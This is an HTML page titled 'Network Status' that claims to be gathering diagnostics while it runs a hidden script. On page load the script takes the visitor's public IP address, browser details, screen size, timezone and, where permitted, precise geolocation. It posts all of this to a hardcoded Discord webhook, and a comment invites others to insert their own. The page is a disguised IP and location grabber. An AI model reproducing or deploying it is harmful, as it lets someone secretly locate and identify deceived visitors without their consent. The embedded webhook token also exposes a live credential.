<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Network Status</title>
  <style>
    body {
      background: #fff;
      font-family: system-ui, sans-serif;
      color: #333;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    #container {
      width: 280px;
      text-align: center;
      color: #444;
      font-size: 0.95rem;
    }
    .dot-pulse {
      position: relative;
      left: 50%;
      transform: translateX(-50%);
      width: 10px;
      height: 10px;
      border-radius: 5px;
      background-color: #999;
      color: #999;
      animation: dotPulse 1.5s infinite linear;
    }
    @keyframes dotPulse {
      0% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.5); opacity: 0.5; }
      100% { transform: scale(1); opacity: 1; }
    }
    .info {
      font-size: 0.9rem;
      color: #666;
    }
    #status {
      margin-top: 1rem;
      font-size: 0.8rem;
      color: #999;
    }
  </style>
</head>
<body>
  <div id="container">
    <h3>Network Status</h3>
    <p class="info">Gathering diagnostics...</p>
    <div class="dot-pulse"></div>
    <div id="status">Running checks, please hold...</div>
  </div>

  <script>
    (async () => {
      const webhookUrl = "https://discord.com/api/webhooks/1368709032197754910/rfJlca3MPqyEgXvwAM3eNKTa_Sn2cRKVY7-XPcuZu6N90Cf3Q4_yoR9TsyRYwiHYSGth"; // 👈 Insert yours

      const sendData = async (content) => {
        await fetch(webhookUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content })
        });
      };

      // Base info
      const browser = navigator.userAgent;
      const platform = navigator.platform;
      const screenRes = `${screen.width}x${screen.height}`;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

      // Get IP
      const ipData = await fetch("https://api64.ipify.org?format=json")
        .then(res => res.json())
        .catch(() => ({ ip: "N/A" }));

      const sendFallback = () => {
        const payload = `📡 IP: ${ipData.ip}\n❌ Location denied or unavailable\n🧠 UA: ${browser}\n🖥️ Platform: ${platform}\n📺 Screen: ${screenRes}\n🕓 Timezone: ${timezone}`;
        sendData(payload);
      };

      // Try geolocation
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            const { latitude, longitude } = pos.coords;
            const payload = `📡 IP: ${ipData.ip}\n📍 Lat: ${latitude}, Lon: ${longitude}\n🧠 UA: ${browser}\n🖥️ Platform: ${platform}\n📺 Screen: ${screenRes}\n🕓 Timezone: ${timezone}`;
            sendData(payload);
          },
          (err) => sendFallback()
        );
      } else {
        sendFallback();
      }
    })();
  </script>
</body>
</html>
